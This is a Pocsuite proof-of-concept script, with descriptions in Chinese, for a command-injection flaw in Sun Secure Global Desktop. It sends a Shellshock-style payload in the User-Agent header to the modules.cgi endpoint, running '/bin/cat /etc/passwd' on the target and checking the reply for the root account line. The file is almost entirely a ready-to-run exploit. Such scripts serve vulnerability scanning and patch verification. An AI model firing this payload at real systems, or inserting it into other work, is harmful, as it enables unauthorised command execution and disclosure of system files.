#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['s0m30ne']
    vulDate = '2016-06-04'
    createDate = '2016-06-08'
    updateDate = '2016-06-08'
    references = ['http://www.seebug.org/vuldb/ssvid-']
    name = 'Sun Secure Global Desktop命令执行'
    appPowerLink = ''
    appName = 'Sun Secure Global Desktop'
    appVersion = ''
    vulType = '命令执行'
    desc = '''
    访问Sun Secure Global Desktop时，User-Agent处存在命令注入，可造成命令执行
    '''
    samples = ['']
    install_requires = ['']
    #请尽量不要使用第三方库，必要时参考 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md#poc-第三方模块依赖说明 填写该字段

    def _attack(self):
        
        return self._verify()

    def _verify(self):
        result = {}
        header = {
            'User-Agent': '() { :; }; echo; /bin/cat /etc/passwd'
        }
        res = req.get("%s/tarantella/cgi-bin/modules.cgi" % self.url, headers = header)
        if 'root:x:0:0:root:' in res.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Url'] = self.url
            result['VerifyInfo']['PostData'] = '() { :; }; echo; /bin/cat /etc/passwd'

        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)